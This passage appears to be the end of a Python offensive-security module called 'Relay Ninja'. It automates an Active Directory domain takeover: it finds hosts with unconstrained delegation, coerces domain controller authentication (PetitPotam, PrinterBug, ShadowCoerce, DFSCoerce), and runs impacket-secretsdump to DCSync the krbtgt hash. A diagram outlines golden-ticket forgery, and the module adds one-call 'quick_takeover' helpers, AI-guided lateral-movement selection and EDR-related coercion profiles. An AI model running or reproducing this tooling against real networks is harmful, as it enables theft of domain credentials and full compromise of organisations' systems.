                self._log("VICTORY", f"🏆 Domain takeover successful in {self.result.total_duration_ms}ms!")
            else:
                self._log("STATUS", f"Partial success - {len(self.result.phases_completed)} phases completed")
            
        except Exception as e:
            self._log("ERROR", f"Takeover failed: {e}")
            self.result.steps.append(RelayChainStep(
                step_id=len(self.result.steps) + 1,
                phase=TakeoverPhase.COMPLETE,
                action="error",
                target=domain,
                status="failed",
                error=str(e)
            ))
        finally:
            # Cleanup
            self.tgt_server.stop()
        
        return self.result
    
    def _execute_recon_phase(
        self,
        domain: str,
        dc_ip: str,
        username: str,
        password: str,
        ntlm_hash: str
    ):
        """Execute reconnaissance phase"""
        self._log("PHASE", "Phase 1: RECON - Finding delegation targets")
        
        step = RelayChainStep(
            step_id=1,
            phase=TakeoverPhase.RECON,
            action="find_delegation",
            target=domain,
            started_at=datetime.now().isoformat()
        )
        
        try:
            targets = self.hunter.find_unconstrained_delegation(
                domain, dc_ip, username, password, ntlm_hash
            )
            
            self.result.delegation_targets = targets
            
            # Identify vulnerable DCs
            self.result.vulnerable_dcs = [
                t.dns_hostname for t in targets 
                if t.is_dc and t.delegation_type == DelegationType.UNCONSTRAINED
            ]
            
            step.status = "completed"
            step.result = {
                'targets_found': len(targets),
                'vulnerable_dcs': len(self.result.vulnerable_dcs)
            }
            
            self._log("RECON", f"Found {len(targets)} delegation targets, {len(self.result.vulnerable_dcs)} vulnerable DCs")
            
        except Exception as e:
            step.status = "failed"
            step.error = str(e)
        
        step.completed_at = datetime.now().isoformat()
        step.duration_ms = int((time.time() - self.start_time) * 1000)
        
        self.result.steps.append(step)
        self.result.phases_completed.append(TakeoverPhase.RECON)
    
    def _execute_coercion_phase(
        self,
        target: str,
        listener: str,
        username: str,
        password: str,
        domain: str
    ):
        """Execute coercion phase"""
        self._log("PHASE", f"Phase 2: COERCE - Triggering {target}")
        
        step = RelayChainStep(
            step_id=2,
            phase=TakeoverPhase.COERCE,
            action=f"coerce_{self.relay_mode.value}",
            target=target,
            started_at=datetime.now().isoformat()
        )
        
        try:
            if self.relay_mode == RelayMode.SHADOW:
                attempt = self.coercer.trigger_shadowcoerce(
                    target, listener, username, password, domain
                )
            elif self.relay_mode == RelayMode.PRINTER:
                attempt = self.coercer.trigger_printerbug(
                    target, listener, username, password, domain
                )
            elif self.relay_mode == RelayMode.PETIT:
                attempt = self.coercer.trigger_petitpotam(
                    target, listener, username, password, domain
                )
            elif self.relay_mode == RelayMode.DFS:
                attempt = self.coercer.trigger_dfscoerce(
                    target, listener, username, password, domain
                )
            else:  # ALL or AI_SELECT
                attempts = self.coercer.trigger_all(
                    target, listener, username, password, domain
                )
                self.result.coercion_attempts = attempts
                attempt = next((a for a in attempts if a.success), attempts[0] if attempts else None)
            
            if attempt:
                self.result.coercion_attempts.append(attempt)
                if attempt.success:
                    self.result.successful_coercions += 1
                    step.status = "completed"
                    step.result = {'method': attempt.method.value, 'success': True}
                else:
                    step.status = "partial"
                    step.error = attempt.error
            
        except Exception as e:
            step.status = "failed"
            step.error = str(e)
        
        step.completed_at = datetime.now().isoformat()
        self.result.steps.append(step)
        self.result.phases_completed.append(TakeoverPhase.COERCE)
    
    def _execute_dcsync_phase(
        self,
        domain: str,
        dc_ip: str,
        tgt_info: Dict
    ):
        """Execute DCSync with captured TGT"""
        self._log("PHASE", "Phase 3: DCSYNC - Extracting secrets")
        
        step = RelayChainStep(
            step_id=3,
            phase=TakeoverPhase.DCSYNC,
            action="dcsync",
            target=dc_ip,
            started_at=datetime.now().isoformat()
        )
        
        try:
            # Set ticket for authentication
            ticket_path = tgt_info.get('path', '')
            
            env = os.environ.copy()
            env['KRB5CCNAME'] = ticket_path
            
            # Run secretsdump with Kerberos auth
            cmd = [
                "impacket-secretsdump",
                "-k", "-no-pass",
                f"{domain}/@{dc_ip}",
                "-just-dc-user", "krbtgt"
            ]
            
            self._log("CMD", "Running DCSync for krbtgt")
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=120,
                env=env
            )
            
            output = result.stdout + result.stderr
            
            # Parse krbtgt hash
            krbtgt_match = re.search(r'krbtgt:(\d+):([a-fA-F0-9]+):([a-fA-F0-9]+)', output)
            if krbtgt_match:
                self.result.krbtgt_hash = krbtgt_match.group(3)
                self.result.dcsync_successful = True
                self.result.domain_admin_achieved = True
                
                step.status = "completed"
                step.result = {'krbtgt_hash_obtained': True}
                
                self._log("DCSYNC", f"🔑 Got krbtgt hash: {self.result.krbtgt_hash[:16]}...")
            else:
                step.status = "partial"
                step.result = {'output': output[:500]}
            
        except Exception as e:
            step.status = "failed"
            step.error = str(e)
        
        step.completed_at = datetime.now().isoformat()
        self.result.steps.append(step)
        self.result.phases_completed.append(TakeoverPhase.DCSYNC)
    
    def _get_local_ip(self) -> str:
        """Get local IP for listener"""
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect(('8.8.8.8', 80))
            ip = s.getsockname()[0]
        except Exception:
            ip = '127.0.0.1'
        finally:
            s.close()
        return ip
    
    def generate_attack_diagram(self) -> str:
        """Generate Mermaid diagram of attack flow"""
        return '''```mermaid
sequenceDiagram
    participant A as Attacker
    participant L as Listener (krbrelayx)
    participant T as Target (Unconstrained)
    participant DC as Domain Controller
    participant AD as Active Directory

    Note over A,AD: 🥷 Relay Ninja Domain Takeover

    rect rgb(200, 150, 255)
        Note over A,T: Phase 1: RECON
        A->>AD: LDAP Query (findDelegation)
        AD-->>A: Unconstrained Delegation Targets
    end

    rect rgb(255, 200, 150)
        Note over A,L: Phase 2: SETUP
        A->>L: Start krbrelayx (TGT capture)
        L-->>A: Listening...
    end

    rect rgb(255, 150, 150)
        Note over A,T: Phase 3: COERCE
        A->>T: ShadowCoerce/PrinterBug
        T->>L: Kerberos Auth (DC$ TGT)
        L-->>A: 🎫 Captured DC$ TGT!
    end

    rect rgb(150, 255, 150)
        Note over A,DC: Phase 4: DCSYNC
        A->>DC: DCSync (using DC$ TGT)
        DC-->>A: 🔑 krbtgt hash
    end

    rect rgb(150, 200, 255)
        Note over A,AD: Phase 5: GOLDEN TICKET
        A->>A: Forge Golden Ticket
        A->>AD: Full Domain Access
        AD-->>A: 🏆 DOMAIN ADMIN!
    end
```'''


# =============================================================================
# HELPER FUNCTIONS
# =============================================================================

def create_relay_ninja(
    relay_mode: str = "shadow",
    scan_id: int = 0
) -> RelayNinjaChain:
    """Create configured Relay Ninja instance"""
    mode_map = {
        'shadow': RelayMode.SHADOW,
        'printer': RelayMode.PRINTER,
        'petit': RelayMode.PETIT,
        'dfs': RelayMode.DFS,
        'all': RelayMode.ALL,
        'ai_select': RelayMode.AI_SELECT,
    }
    
    mode = mode_map.get(relay_mode.lower(), RelayMode.SHADOW)
    
    return RelayNinjaChain(scan_id=scan_id, relay_mode=mode)


def quick_takeover(
    domain: str,
    dc_ip: str,
    username: str,
    password: str = None,
    ntlm_hash: str = None,
    relay_mode: str = "shadow"
) -> DomainTakeoverResult:
    """Quick domain takeover attempt"""
    ninja = create_relay_ninja(relay_mode)
    return ninja.execute_takeover(
        domain=domain,
        dc_ip=dc_ip,
        username=username,
        password=password,
        ntlm_hash=ntlm_hash
    )


def get_ai_jump_recommendation(
    domain: str,
    dc_ip: str,
    username: str,
    password: str = None,
    ntlm_hash: str = None
) -> Dict[str, Any]:
    """Get AI recommendation for best lateral jump"""
    hunter = DelegationHunter()
    targets = hunter.find_unconstrained_delegation(
        domain, dc_ip, username, password, ntlm_hash
    )
    
    selector = AIJumpSelector()
    return selector.get_next_best_jump(targets)


# =============================================================================
# EXPORTS
# =============================================================================

__all__ = [
    # Enums
    'RelayMode',
    'DelegationType',
    'TakeoverPhase',
    'CoercionProtocol',
    
    # Dataclasses
    'DelegationTarget',
    'CoercionAttempt',
    'RelayChainStep',
    'DomainTakeoverResult',
    
    # Classes
    'DelegationHunter',
    'CoercionNinja',
    'TGTCaptureServer',
    'AIJumpSelector',
    'RelayNinjaChain',
    
    # Helper functions
    'create_relay_ninja',
    'quick_takeover',
    'get_ai_jump_recommendation',
    
    # Constants
    'EDR_COERCION_PROFILES',
    'MITRE_TECHNIQUES',
]
